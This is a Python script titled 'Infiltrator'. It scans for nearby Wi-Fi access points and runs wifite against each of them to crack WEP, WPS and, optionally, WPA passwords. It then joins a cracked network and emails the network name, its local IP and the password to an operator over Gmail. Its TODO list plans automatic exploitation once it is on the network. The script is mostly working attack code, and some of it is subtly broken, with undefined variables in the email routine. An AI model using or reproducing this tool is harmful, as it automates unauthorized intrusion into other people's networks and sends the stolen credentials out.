import csv
import subprocess
from scapy.all import *
import smtplib
import netifaces as ni
import socket
import time
import sys
import os
import argparse

#TODO: 
#Make faulty AP detection (Blacklist ones that fail consistently)
#Auto-select wifi interface (Strongest or random)
#Make more reliable in general
#Auto exploit once connected
#BSSID instead of ESSID
#Try later if none found nearby

# Default Settings, overwritten by args:
interface = 'wlan0'
test_server = 'www.google.com'
username = ''
pwd = ''
toaddrs = ''
test_mode = False
wpa_attack = False
wpadriver = 'nl80211,wext' #Use 'wext' and/or 'nl80211'
dictionary = ''
# End settings.

parser = argparse.ArgumentParser()
parser.add_argument("-bg", "--background", help="Run in the background", action="store_true")
parser.add_argument("-ac", "--autocrack", help="Run various automatic cracking programs once connected - W.I.P.", action="store_true")
parser.add_argument("-i", "--interface", help="Choose wireless interface to use")
parser.add_argument("-test", "--testmode", help="Will assume no internet connection when starting", action="store_true")
parser.add_argument("-addy", "--address", help="Choose email address to receive notification email")
parser.add_argument("-usr", "--username", help="Choose email address to send notification email, i.e.: user@gmail.com")
parser.add_argument("-pwd", "--password", help="Choose password for email to send notification email")
parser.add_argument("-wpa", "--wpaattack", help="Enable the slower WPA cracking as last resort", action="store_true")
parser.add_argument("-dict", "--dictionary", help="Dictionary to use for WPA cracking")
args = parser.parse_args()

subprocess.call(["sudo", "clear"])
path = str(os.getcwd())
time_now = time.strftime("%I:%M:%S")
if args.background:
    sys.stdout = open('%s/logs/%s_infiltrator.log' %(path, time_now), 'w')
if args.interface:
    interface = args.interface
if args.testmode:
    test_mode = True
if args.address:
    toaddrs = args.address
if args.username:
    username = args.username
if args.password:
    pwd = args.password
if args.wpaattack:
    wpa_attack = True
if args.dictionary:
    dictionary = args.dictionary

print "Infiltrator by Evanito\n\nStarted, checking for internet..."

def is_connected():
    try:
        host = socket.gethostbyname(test_server)
        socket.create_connection((host, 80), 2)
        if test_mode == False:
            print "Internet found!"
        return True
    except:
        pass
    print "No internet."
    return False
    
def mon_mode(iface):
    subprocess.call(["sudo", "ifconfig", iface, "down"])
    subprocess.call(["sudo", "iwconfig", iface, "mode", "Monitor"])
    subprocess.call(["sudo", "ifconfig", iface, "up"])

def man_mode(iface):
    subprocess.call(["sudo", "ifconfig", iface, "down"])
    subprocess.call(["sudo", "iwconfig", iface, "mode", "Managed"])
    subprocess.call(["sudo", "ifconfig", iface, "up"])

def wep_connect(iface, ap, passwd):
    man_mode(iface)
    subprocess.call(["sudo", "iwconfig", iface, "essid", str(ap), "key", str(passwd)]) 
    subprocess.call(["sudo", "dhclient", iface]) 
    print "Done."

def wpa_connect(iface, ap, passwd):
    man_mode(iface)
    subprocess.call(["sudo", "rm", "%s/wpa_connect.conf" %(path)]) 
    f01 = open("%s/wpa_connect.conf" %(path), "w")
    subprocess.call(["wpa_passphrase", str(ap), str(passwd)], stdout=f01)
    print "Connecting..."
    subprocess.call(["sudo", "wpa_supplicant","-D%s" %(wpadriver), "-i%s" %(iface), "-c%s/wpa_connect.conf" %(path)])
    print "Done connecting. Getting DHCP..."
    #subprocess.call(["sudo", "dhclient", "-r"])
    subprocess.call(["sudo", "dhclient", iface])
    print "Done."  

def encrypt_type(ap):
    with open('%s/cracked.csv' %(path), mode='r') as knowns:
        reader = csv.reader(knowns)
        encryption = dict((rows[2],rows[1]) for rows in reader)
        return encryption[ap]

def populate_known():
    with open('%s/cracked.csv' %(path), mode='r') as knowns:
        reader = csv.reader(knowns)
        networks = dict((rows[2],rows[3]) for rows in reader)
        return networks

def connect_wifi(iface, ap, passwd):
    if encrypt_type(ap) == 'WPA' or encrypt_type(ap) == 'WPA2':
        wpa_connect(iface, ap, passwd)
    if encrypt_type(ap) == 'WEP':
        wep_connect(iface, ap, passwd)

def send_email():
    if toaddrs != '' and username != '' and pwd != '':
        print "Sending success email..."
        ni.ifaddresses(interface)
        ip = ni.ifaddresses(interface)[2][0]['addr']
        msg = "\r\n".join([
            "From: %s" %(username),
            "To: %s" %(toaddrs),
            "Subject: Infiltration successful",
            "",
            "I'm in. My local IP is %s, Im on the network %s, and the password is %s" %(ip, essid, password)
            ])
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.ehlo()
        server.starttls()
        server.login(username, pwd)
        server.sendmail(username, toaddrs, msg)
        server.quit()
        print 'Sent!'
    else:
        print "Email requirements not met. Not sending success email."

def crosscheck():
    networks = populate_known()
    foundone = False
    for found in ap_list:
        if found in networks:
            foundone = True
            essid = found
            password = networks[found]
            break
    if foundone == True:
        return [True, essid, password]
    else:
        return [False]

ap_list = []
def PacketHandler(pkt):
    if pkt.haslayer(Dot11):
        if pkt.type == 0 and pkt.subtype == 8:
            if pkt.info not in ap_list:
                ap_list.append(pkt.info)
                print "Found AP MAC: %s with SSID: %s " %(pkt.addr2, pkt.info)


# Start -
if is_connected() == True and test_mode == False:
    raise SystemExit

mon_mode(interface)
print "Looking for nearby networks..."
sniff(iface=interface, prn = PacketHandler, timeout=10)
man_mode(interface)

print "\n This is what we know:\n%s" %(populate_known()) 

print "\n And here's what's nearby:\n%s" %(ap_list)
crosschecked = crosscheck()
if crosschecked[0] == False:
    print "Wifite time."
    gotem = False
    for ap in ap_list: 
        subprocess.call(["sudo", "wifite", '-wps', '-wep', '-pow', '25', "-i", interface, '-quiet', '-e', ap])
        if ap in populate_known():
            print "Cracked one."
            crosschecked = crosscheck()
            gotem = True
            connect_wifi(interface, crosschecked[1], crosschecked[2])
            if is_connected() == True:
                print "Connected."
                break
            else:
                subprocess.call(['sudo', 'reboot'])
                raise SystemExit
    if gotem == False and wpa_attack == True:
        subprocess.call(["sudo", "wifite", '-crack', '-dict', dictionary, '-pow', '35', '-mac', "-i", interface, '-quiet', '-wpadt', '30', '-strip', '-aircrack', '-wpa', '-wep'])	
        for ap in ap_list:
            if ap in populate_known():
                print "Cracked one."
                crosschecked = crosscheck()
                gotem = True
                connect_wifi(interface, crosschecked[1], crosschecked[2])
                if is_connected() == True:
                    print "Connected."
                    break
            else:
                subprocess.call(['sudo', 'reboot'])
                raise SystemExit
    else:
        print "None found..."
    print 'Wifite phase finished.'
else:
    print "\nWe got one!\n%s ; %s" %(crosschecked[1], crosschecked[2])
    connect_wifi(interface, crosschecked[1], crosschecked[2])

if is_connected() == True:
    send_email()
else:
    subprocess.call(['sudo', 'reboot'])
    raise SystemExit

if args.autocrack:
    print "Autocrack Work in progress"